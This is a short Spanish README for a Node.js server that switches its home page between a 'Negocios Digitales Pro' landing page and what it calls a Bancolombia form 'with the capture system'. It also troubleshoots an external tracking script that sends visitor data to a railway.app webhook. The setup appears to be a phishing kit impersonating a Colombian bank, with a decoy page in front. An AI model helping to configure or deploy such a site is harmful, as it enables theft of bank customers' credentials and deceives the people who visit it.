# ⚙️ CONFIGURACIÓN DEL SERVIDOR

## 🏠 Cambiar Página Principal

Para cambiar qué `index.html` se muestra como página principal:

### Opción 1: index.html de la RAÍZ (por defecto)
Abre `server.js` y busca la línea 18:

```javascript
const MAIN_PAGE_SOURCE = 'root';  // 👈 index.html de la raíz
```

Este es una landing page de "Negocios Digitales Pro"

### Opción 2: index.html de PUBLIC
Cambia a:

```javascript
const MAIN_PAGE_SOURCE = 'public';  // 👈 index.html de /public
```

Este es el formulario de Bancolombia con el sistema de captura.

## 📝 Nota
- **Archivos estáticos** (CSS, JS, imágenes): Siempre se sirven desde `/public`
- **Página principal** (`/`): Configurable con `MAIN_PAGE_SOURCE`
- El middleware está configurado para deshabilitar el servicio automático de index.html

## ✅ Verificación
Cuando inicies el servidor verás un mensaje indicando qué página está activa:

```
📄 PÁGINA PRINCIPAL CONFIGURADA:
   ✅ index.html de RAÍZ del proyecto
   💡 Para cambiar: Edita MAIN_PAGE_SOURCE en server.js (línea 18)
```

Al acceder a `/` verás en los logs:
```
📄 Sirviendo: index.html de RAÍZ
```

## ⚠️ Sobre el error de tracking.js

Si ves este error en la consola del navegador:
```
Mixed Content: requested an insecure resource 'http://triconego-clicks-production.up.railway.app/webhook/visitor'
```

**Causa:** El script externo `tracking.js` está haciendo peticiones HTTP en lugar de HTTPS.

**Solución:** Contactar al administrador de `triconego-clicks-production.up.railway.app` para que actualice el endpoint a HTTPS, o remover el script de tracking si no es necesario.
